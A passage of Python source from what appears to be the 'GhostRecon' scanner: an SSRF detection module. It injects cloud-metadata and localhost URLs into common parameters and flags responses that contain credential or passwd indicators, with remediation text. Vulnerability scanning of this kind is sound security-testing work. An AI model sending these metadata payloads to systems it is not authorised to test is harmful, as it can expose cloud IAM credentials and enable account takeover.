"""
SSRFModule — GhostRecon module.
"""
import re
import time
import urllib.parse

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None

from modules import BaseModule


class SSRFModule(BaseModule):
    NAME = "SSRF"

    def run(self):
        self.ui.section("SSRF — Server-Side Request Forgery Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        ssrf_params  = ["url", "redirect", "next", "return", "callback", "fetch",
                        "load", "link", "src", "uri", "path", "target", "dest", "destination"]
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://127.0.0.1/",
            "http://localhost/",
            "http://[::1]/",
        ]

        s = self._session()
        for param in ssrf_params:
            for payload in ssrf_payloads[:2]:  # Quick check
                url = f"{self.base_url}?{param}={urllib.parse.quote(payload)}"
                try:
                    resp = s.get(url, timeout=self.timeout)
                    # SSRF indicators: AWS metadata content or unusual responses
                    ssrf_indicators = [
                        "ami-id", "instance-id", "iam/security-credentials",
                        "computeMetadata", "kube-env", "root:x:0:",
                    ]
                    if any(ind in resp.text for ind in ssrf_indicators):
                        self.db.add(
                            title=f"SSRF via '{param}' Parameter — Cloud Metadata Accessible",
                            severity="critical", url=self.base_url, module=self.NAME,
                            description=(
                                f"The '{param}' parameter makes the server fetch arbitrary URLs. "
                                f"Cloud metadata endpoint {payload} returned sensitive data. "
                                "An attacker can access IAM credentials and take over the cloud account."
                            ),
                            remediation=(
                                "Whitelist allowed URL schemes and destinations. Block access to "
                                "RFC1918 and cloud metadata IP ranges at the network level. "
                                "Disable URL fetch functionality if not needed."
                            ),
                            cvss="9.1", confidence="high",
                        )
                        self.ui.find("critical", f"SSRF — Cloud Metadata via '{param}'", self.base_url)
                    time.sleep(self.delay)
                except Exception:
                    continue


# ─── Secrets Module ────────────────────────────────────────────────────────────